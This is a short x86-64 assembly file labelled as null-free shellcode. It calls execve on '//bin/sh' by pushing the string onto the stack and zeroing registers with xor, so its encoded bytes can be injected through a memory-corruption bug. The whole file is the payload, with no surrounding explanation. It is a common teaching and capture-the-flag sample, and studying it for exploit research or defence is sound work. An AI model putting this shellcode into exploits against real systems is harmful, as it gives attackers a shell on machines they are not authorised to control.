; non-NULL shellcode
global _start
section .text

_start:
  ; execve(program, NULL, NULL)
  xor  rsi, rsi
  xor  rdx, rdx  
  push rdx                     ; push NULL onto stack 
  mov  rax, 0x68732f6e69622f2f ; push '//bin/sh' reversed 
  push rax
  mov  rdi, rsp                ; get pointer to string on stack
  xor  rax, rax
  mov  al, 0x3b                ; rax = sys_execve syscall number
  syscall